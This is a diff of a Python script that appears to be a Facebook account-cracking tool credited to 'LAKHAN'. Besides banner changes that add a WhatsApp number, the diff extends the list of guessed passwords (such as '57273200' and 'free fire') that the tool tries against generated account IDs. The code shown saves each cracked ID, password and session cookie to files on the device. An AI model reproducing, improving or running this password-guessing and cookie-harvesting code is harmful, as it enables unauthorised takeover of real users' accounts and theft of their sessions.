@@ -160,8 +160,7 @@ os.system("xdg-open ")
 #app  check 
 
 
-logo = """       
-
+logo = """   
 
     /$$        /$$$$$$  /$$   /$$ /$$   /$$  /$$$$$$  /$$   /$$
    | $$       /$$__  $$| $$  /$$/| $$  | $$ /$$__  $$| $$$ | $$
@@ -172,18 +171,14 @@ logo = """
    | $$$$$$$$| $$  | $$| $$ \  $$| $$  | $$| $$  | $$|  \  $$
    |________/|__/  |__/|__/  \__/|__/  |__/|__/  |__/|__/  \__/
                                                             
-                                                            
-                                                            
-
-
 \033[1;31m☆《=============================================》☆
-\033[1;36m[>] \033[1;34mCREATED BY   : » \033[1;34mOWNER LAKHAN
-\033[1;32m[>] \033[1;36mFACEBOK        : » \033[1;36m LAKHAN 
-\033[1;37m[>] \033[1;37mGITHUB          : » \033[1;37mLAKHAN
-\033[1;33m[>] \033[1;34mWHATSAPP   : » \033[1;34mOFFLINE
-\033[1;35m[>] \033[1;36mLEGEND        : » LAKHAN
-\033[1;32m[>] \033[1;33mVERSION      : » \033[1;33m2.1
-\033[1;31m《=============================================》☆\n\n"""  
+\033[1;36m[•] \033[1;34mCREATED BY  : » \033[1;34mOWNER LAKHAN
+\033[1;32m[•] \033[1;36mFACEBOK      : » \033[1;36mLAKHAN
+\033[1;37m[•] \033[1;37mGITHUB         : » \033[1;37mLAKHAN801
+\033[1;33m[•] \033[1;34mWHATSAPP    : » \033[1;34m8302788872
+\033[1;35m[•] \033[1;36mBROTHER     : » HONEY ANOX LAKHAN
+\033[1;32m[•] \033[1;33mVERSION      : » \033[1;33m2.1
+\033[1;31m《☆=============================================》☆\n\n"""  
 loop = 0
 oks = []
 cps = []
@@ -285,7 +280,7 @@ def random_number():
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'57273200']
+			pwx = [kode+guru,mk,'57273200','59039200','free fire','57575751']
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
@@ -344,7 +339,7 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[151:166]
 
-				print('\r\033[1;32m[LAKHANOK] '+uid+' | '+ps)
+				print('\r\033[1;32m[LAKHAN-] '+uid+' | '+ps)
 
 				print(f" Cookie : {coki}")
 
@@ -466,11 +461,11 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[151:166]
 
-				print('\r\033[1;32m[LAKHAN-OK] '+uid+' | '+ps)
+				print('\r\033[1;32m[LAKHANOK] '+uid+' | '+ps)
 
 				print(f" Cookie : {coki}")
 
-				open('/sdcard/LAKHAN-cookie.txt','a'). write(uid+'|'+ps+'|' +coki+'\n')
+				open('/sdcard/lakhan-cookie.txt','a'). write(uid+'|'+ps+'|' +coki+'\n')
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 
 				oks.append(uid)
@@ -497,7 +492,7 @@ def rcrack(uid,pwx,tl):
 
 		loop+=1
 
-		sys.stdout.write('\r\33[1;37m[RUN LAKHAN -] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[RUNNING LAKHAN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 
 		sys.stdout.flush()
 
@@ -505,4 +500,4 @@ def rcrack(uid,pwx,tl):
 
 		pass
 
-menu()
+menu() 
